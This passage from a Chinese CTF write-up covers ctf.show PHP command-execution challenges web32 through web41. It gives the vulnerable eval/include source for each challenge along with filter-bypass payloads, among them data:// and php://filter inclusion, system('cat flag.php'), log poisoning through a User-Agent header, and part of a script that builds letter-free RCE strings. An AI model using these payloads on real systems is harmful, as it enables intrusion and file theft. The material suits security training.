punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反引号，分号，括号、echo没了</p><h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/palin,&lt;?php system('cat flag.php');?></span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>include可以不用括号，分号可以用?&gt;代替</p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是多了一个双引号</p><h3 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/palin,&lt;?php system('cat flag.php');?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=|\/|[0-9]/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了：&lt;=/数字</p><h3 id="payload：-2"><a href="#payload：-2" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/palin,&lt;?php system('cat flag.php');?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload：-3"><a href="#payload：-3" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/palin,&lt;?php system('cat fla?.php');?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="骚姿势：配合UA头，包含日志文件："><a href="#骚姿势：配合UA头，包含日志文件：" class="headerlink" title="骚姿势：配合UA头，包含日志文件："></a>骚姿势：配合UA头，包含日志文件：</h3><pre><code>GET /?file=/var/log/nginx/access.log HTTP/1.1Host: 5f1578cc-e37e-47a9-9345-0d1bd3b90c8e.challenge.ctf.show:8080Upgrade-Insecure-Requests: 1User-Agent: &lt;?=`tac f*`?&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: __cfduid=da172a34e9b16f1e15ed1c229eea973741619340401Connection: close</code></pre><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|file|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多过滤了php和file，可以继续使用data协议不过是base64编码或者用<code>&lt;?= ?&gt;</code>来代替php</p><h3 id="payload：-4"><a href="#payload：-4" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/palin,&lt;?=system('cat fla?.???');?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改变在第七行，给$c连接了一个.php，他这么做的目我没有get到，利用上一道题目的payload接着打就可以了</p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ok，细节问题，出题人虽然过滤了括号但是，却只是过滤了中文版的括号，所以当成套娃题目做就可以了</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>each() 返回数组中当前的键/值对并将数组指针向前移动一步</li><li>end() 将数组的内部指针指向最后一个单元</li><li>next() 将数组中的内部指针向前移动一位</li><li>prev() 将数组中的内部指针倒回一位</li><li>array_reverse() 以相反的元素顺序返回数组</li><li>localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</li><li>pos()：返回数组中当前元素的值</li><li>scandir()：获取目录下的文件</li><li>array_reverse()：将数组逆序排列</li><li>next()：函数将内部指针指向下一元素，并输出</li><li>print_r(scandir(‘.’)); 查看当前目录下的所有文件名</li><li>current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</li></ul><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"echo($c);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意第6行的变化，以及传参形式变为post类型，同时考虑|运算符</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413" target="_blank" rel="noopener">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p><p>用4👴的脚本：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date:   2020-11-21 20:31:22*/</span><span class="token comment" spellcheck="true">//或</span><span class="token keyword">function</span> <span class="token function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//异或</span><span class="token keyword">function</span> <span class="token function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//取反</span><span class="token keyword">function</span> <span class="token function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string">'[+]your function: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$system</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string">'[+]your command: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$command</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'[*] (~'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$system</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">')(~'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">');'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//mode=1代表或，2代表异或，3代表取反</span><span class="token comment" spellcheck="true">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span><span class="token keyword">function</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">,</span> <span class="token variable">$preg</span><span class="token operator">=</span><span class="token string">'/[0-9]/i'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">!=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"rce.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token string">'0'</span><span class="token punctuation">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token string">'0'</span><span class="token punctuation">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$par1</span> <span class="token operator">=</span> <span class="token string">"%"</span><span class="token punctuation">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>                    <span class="token variable">$par2</span> <span class="token operator">=</span> <span class="token string">'%'</span><span class="token punctuation">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>                    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token punctuation">.</span><span class="token variable">$res</span><span class="token punctuation">.</span><span class="token string">" "</span><span class="token punctuation">.</span><span class="token variable">$par1</span><span class="token punctuation">.</span><span class="token string">" "</span><span class="token punctuation">.</span><span class="token variable">$par2</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">negateRce</span><span 